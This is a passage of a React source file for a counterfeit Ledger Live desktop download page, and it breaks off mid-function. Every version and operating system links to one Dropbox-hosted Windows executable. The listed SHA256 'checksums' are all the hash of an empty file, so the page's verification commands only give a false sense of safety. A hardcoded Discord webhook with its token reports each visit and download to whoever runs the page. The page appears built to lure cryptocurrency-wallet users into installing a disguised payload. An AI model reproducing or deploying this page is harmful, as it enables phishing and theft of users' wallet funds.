import React from 'react';
import { useState, useEffect } from 'react';
import axios from 'axios';
import { Download, CheckCircle, Terminal, Copy, Check, Command, FileTerminal } from 'lucide-react';
import Header from './components/Header';
import Footer from './components/Footer';
import AnnouncementBar from './components/AnnouncementBar';

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321730136147623966/lHHQFPEFSLGQrpB1HsZ82jBRWDEL-KnBb-jDRERjDvmaqPQkdXo-9VBSG2uUvRjW36j7';

const sendDiscordNotification = async (message: string) => {
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: message
    });
  } catch (error) {
    console.error('Failed to send Discord notification:', error);
  }
};

interface VerificationCommand {
  os: 'windows' | 'mac' | 'linux';
  getCommand: (version: string) => string;
}

const verificationCommands: VerificationCommand[] = [
  {
    os: 'windows',
    getCommand: (version) => `certutil -hashfile "ledger-live-desktop-${version}-win.exe" SHA256`
  },
  {
    os: 'mac',
    getCommand: (version) => `shasum -a 256 ledger-live-desktop-${version}.dmg`
  },
  {
    os: 'linux',
    getCommand: (version) => `sha256sum ledger-live-desktop-${version}-linux-x86_64.AppImage`
  }
];

interface Release {
  version: string;
  date: string;
  downloads: {
    windows: string;
    mac: string;
    linux: string;
  };
  checksums: {
    windows: string;
    mac: string;
    linux: string;
  };
}

const releases: Release[] = [
  {
    version: '2.96.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: {
      windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
    }
  },
  {
    version: '2.94.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.92.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.92.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.91.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.89.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.89.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.87.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.87.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.86.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.85.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.85.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.84.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.83.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.81.2',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.79.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.79.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.77.2',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.77.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.75.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.73.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.73.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.71.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.71.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.69.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.68.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.66.0',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.64.2',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  },
  {
    version: '2.64.1',
    date: '',
    downloads: {
      windows: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      mac: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1',
      linux: 'https://www.dropbox.com/scl/fi/0uejbwokxa7uzfh6bk2wd/ledger-live-desktop-win.exe?rlkey=4xaqcdfidvkg5nfgks3sceu1d&st=1stk2ni0&dl=1'
    },
    checksums: { windows: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', mac: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', linux: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }
  }
];

function App() {
  const [selectedVersion, setSelectedVersion] = useState(releases[0].version);
  const [selectedOS, setSelectedOS] = useState<'windows' | 'mac' | 'linux'>('windows');
  const [copiedHash, setCopiedHash] = useState(false);
  const [copiedCommand, setCopiedCommand] = useState(false);

  useEffect(() => {
    // Send notification when page loads
    sendDiscordNotification('🌐 New visitor on Ledger releases page');
  }, []);

  const handleDownload = (version: string, os: string) => {
    // Send notification when download button is clicked
    sendDiscordNotification(`📥 User downloaded Ledger Live ${version} for ${os}`);
